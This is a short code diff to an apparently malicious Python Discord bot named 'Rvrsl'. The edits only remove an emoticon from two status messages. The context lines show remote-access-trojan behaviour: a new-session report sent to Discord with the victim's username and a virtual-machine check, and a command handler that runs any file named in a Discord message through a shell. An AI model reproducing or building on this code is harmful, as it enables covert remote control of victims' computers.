@@ -502,7 +502,7 @@ async def on_ready():
 		isvm = "yes"
 
 	await channel.send  (f"""```ansi
-Rvrsl - new session created! >w<
+Rvrsl - new session created
 
 - session: {session_id}
 - username: {os.getlogin()}
@@ -605,7 +605,7 @@ async def on_message(message):
 		file = message.content.split(" ")[1]
 		subprocess.Popen(file, shell=True)
 		await message.reply(f"""```ansi
-\033[2;Rvrsl - run >w<
+\033[2;Rvrsl - run
 
 \033[2;37mstarted {file}!\033[0m\033[2;35m\033[0m```""")
 
